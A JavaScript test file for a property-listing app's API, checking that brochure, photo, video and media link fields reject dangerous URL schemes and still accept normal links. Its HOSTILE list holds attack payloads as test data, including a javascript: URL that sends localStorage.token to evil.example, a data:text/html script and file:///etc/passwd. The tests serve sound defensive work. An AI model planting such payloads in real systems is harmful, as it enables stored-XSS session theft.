// Stored links, and the scheme nobody was checking.
//
// TEXT.URL bounded how long a link could be. Nothing bounded what it *was*, so
// `brochure_url` could be saved as `javascript:…` — and the app renders that column
// straight into an href, where React emits it with a console warning and no more.
// A listing is the object a team shares, so the agent who opened it next was a
// manager or a teammate, and the session token lives in localStorage next to it.
//
// The rule already existed in micropage.js as `safeUrl`, applied to the PUBLIC page
// because that one was understood to be rendering strangers' data. These tests hold
// the same line on the way INTO the database, for every screen inside the app.
import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { createTestDb, dropTestDb } from './helpers.js'

process.env.NODE_ENV = 'test'
delete process.env.OPENROUTER_API_KEY
delete process.env.WHATSAPP_ACCESS_TOKEN
delete process.env.WHATSAPP_APP_SECRET
const dbName = await createTestDb('linkscheme')

const { app } = await import('../index.js')
const { closePool } = await import('../db.js')

let server
let base
let token

const req = (method, url, body, tok = token) =>
  fetch(base + url, {
    method,
    headers: {
      'content-type': 'application/json',
      ...(tok ? { authorization: `Bearer ${tok}` } : {}),
    },
    ...(body !== undefined ? { body: JSON.stringify(body) } : {}),
  })

before(async () => {
  await new Promise((resolve) => {
    server = app.listen(0, () => {
      base = `http://127.0.0.1:${server.address().port}`
      resolve()
    })
  })
  const out = await (
    await req('POST', '/api/auth/signup', { name: 'Link Agent', phone: '+919800000501', password: 'secret123' })
  ).json()
  token = out.token
})

after(async () => {
  server?.close()
  await closePool()
  await dropTestDb(dbName)
})

const listing = (extra) => ({ title: 'Sea-facing 3BHK', city: 'Mumbai', ...extra })

// The schemes that actually do something when followed from an <a href>. `data:` is
// in here because a data:text/html document navigated to from a link runs in a
// context the app's own origin can be reached from in older browsers, and there is
// no reason a brochure would ever be one.
const HOSTILE = [
  'javascript:fetch("https://evil.example/"+localStorage.token)',
  'JaVaScRiPt:alert(1)',
  '  javascript:alert(1)', // leading whitespace: the scheme still parses in a browser
  'data:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
  'file:///etc/passwd',
  '//evil.example/brochure.pdf', // protocol-relative: another origin behind a leading slash
]

for (const url of HOSTILE) {
  test(`POST /api/properties refuses a brochure link of ${JSON.stringify(url)}`, async () => {
    const res = await req('POST', '/api/properties', listing({ brochure_url: url }))
    assert.equal(res.status, 400, `stored a ${url.slice(0, 20)} brochure link`)
    const body = await res.json()
    assert.equal(body.code, 'FIELD_NOT_A_URL')
    assert.equal(body.field, 'brochure_url')
  })
}

test('PUT /api/properties/:id refuses to turn a saved brochure link into a script', async () => {
  // The edit path matters as much as create: a listing can be saved clean and
  // rewritten later, and only one of the two was ever going to be probed.
  const created = await (await req('POST', '/api/properties', listing({ brochure_url: 'https://cdn.example/b.pdf' }))).json()

  const res = await req('PUT', `/api/properties/${created.id}`, { brochure_url: 'javascript:alert(1)' })
  assert.equal(res.status, 400)
  assert.equal((await res.json()).code, 'FIELD_NOT_A_URL')

  const after = await (await req('GET', `/api/properties/${created.id}`)).json()
  assert.equal(after.brochure_url, 'https://cdn.example/b.pdf', 'the rejected edit still changed the column')
})

test('a single bad entry disqualifies the whole photos array', async () => {
  // Every photo ends up in an attribute, so checking only the first would leave the
  // rest of the array as an unchecked way in.
  const res = await req('POST', '/api/properties', listing({
    photos: ['https://cdn.example/1.jpg', 'javascript:alert(1)'],
  }))
  assert.equal(res.status, 400)
  assert.equal((await res.json()).field, 'photos')
})

test('video_url is held to the same rule', async () => {
  const res = await req('POST', '/api/properties', listing({ video_url: 'javascript:alert(1)' }))
  assert.equal(res.status, 400)
  assert.equal((await res.json()).field, 'video_url')
})

test('a media asset registered by URL cannot carry a script either', async () => {
  // Media is the other shared object: assets are attached to chats and, on a team
  // account, listed for everyone.
  const res = await req('POST', '/api/media', { title: 'Brochure', kind: 'brochure', url: 'javascript:alert(1)' })
  assert.equal(res.status, 400)
  assert.equal((await res.json()).code, 'FIELD_NOT_A_URL')
})

// --- and the links that must still work ------------------------------------------
//
// A scheme check is only worth having if it is narrower than "reject anything
// unusual". These are the four shapes the product genuinely stores.

test('an https brochure link is stored unchanged', async () => {
  const res = await req('POST', '/api/properties', listing({ brochure_url: 'https://cdn.example/floorplan.pdf?v=2&x=1' }))
  assert.equal(res.status, 200)
  assert.equal((await res.json()).brochure_url, 'https://cdn.example/floorplan.pdf?v=2&x=1')
})

test('a plain http link still works — not every builder site is on TLS', async () => {
  const res = await req('POST', '/api/properties', listing({ brochure_url: 'http://builder.example/b.pdf' }))
  assert.equal(res.status, 200)
})

test('the relative /uploads path saveUpload returns is accepted', async () => {
  // PUBLIC_BASE_URL is unset in most deployments and in every test, so this is the
  // shape our OWN uploader produces. A check that rejected it would break the
  // brochure picker outright.
  const res = await req('POST', '/api/properties', listing({ brochure_url: '/uploads/deadbeef.pdf' }))
  assert.equal(res.status, 200)
  assert.equal((await res.json()).brochure_url, '/uploads/deadbeef.pdf')
})

test('clearing a brochure link is not a scheme violation', async () => {
  const created = await (await req('POST', '/api/properties', listing({ brochure_url: 'https://cdn.example/b.pdf' }))).json()

  for (const cleared of ['', null]) {
    const res = await req('PUT', `/api/properties/${created.id}`, { brochure_url: cleared })
    assert.equal(res.status, 200, `clearing the field with ${JSON.stringify(cleared)} was rejected`)
  }
})

test('a listing with no links at all is unaffected', async () => {
  const res = await req('POST', '/api/properties', listing({ locality: 'Bandra' }))
  assert.equal(res.status, 200)
})
